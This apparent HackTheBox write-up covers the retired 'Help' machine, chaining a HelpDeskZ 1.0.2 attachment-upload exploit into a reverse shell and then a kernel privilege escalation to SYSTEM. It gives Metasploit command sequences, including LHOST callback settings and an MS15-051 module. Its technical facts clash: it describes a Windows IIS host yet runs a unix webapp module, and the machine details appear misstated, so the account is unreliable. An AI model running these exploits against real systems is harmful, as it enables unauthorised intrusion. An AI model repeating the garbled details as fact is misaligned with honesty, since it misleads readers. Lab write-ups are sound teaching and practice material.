HTB Help: HelpDeskZ upload RCE and a kernel ride to SYSTEM

retired-machineeasy

Help is a retired HackTheBox easy Windows machine built on HelpDeskZ 1.0.2, a small support-ticket app on IIS. Synopsis: anonymous ticket upload becomes PHP RCE, then an old kernel flaw finishes the climb to SYSTEM.

$ Enumeration — ticket app with attachments

# nmap: find the helpdesk
nmap -sC -sV -oN help.nmap 10.10.10.121

IIS hosting HelpDeskZ 1.0.2. The ticket form accepts file attachments with weak validation, and uploads land in a web-accessible directory. Support portals that take attachments are file-upload attack surface in a helpdesk costume.

$ Foothold — ticket upload RCE

# msfconsole: helpdeskz upload exec
msfconsole -q
msf6 > use exploit/unix/webapp/helpdeskz_upload_exec
msf6 exploit(helpdeskz_upload_exec) > set RHOSTS 10.10.10.121
msf6 exploit(helpdeskz_upload_exec) > set LHOST 10.10.14.23
msf6 exploit(helpdeskz_upload_exec) > run

Submit a ticket with a PHP webshell attached; the module automates the bypass and browsing the uploaded file returns a shell as the low-privilege web user. When a form takes files, test the files first.

$ Privilege escalation — MS15-051

# msfconsole: client_copy_image privesc
msf6 > use exploit/windows/local/ms15_051_client_copy_image
msf6 exploit(ms15_051_client_copy_image) > set SESSION 1
msf6 exploit(ms15_051_client_copy_image) > run
[*] Meterpreter session 2 opened as NT AUTHORITY\SYSTEM

Windows Server 2012 era plus a low shell: local_exploit_suggester points at MS15-051 (client-copy-image impersonation). Both flags fall. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

SQL injection on the ticket form for an hour (the upload is the vulnerability) and potato exploits before the kernel suggester (match the privesc to the OS generation).

$ Remediation notes

Validate uploads by content outside the web root, patch kernel escalation flaws on cadence, and treat file-accepting endpoints as untrusted input. Written by Lucky Thandel.
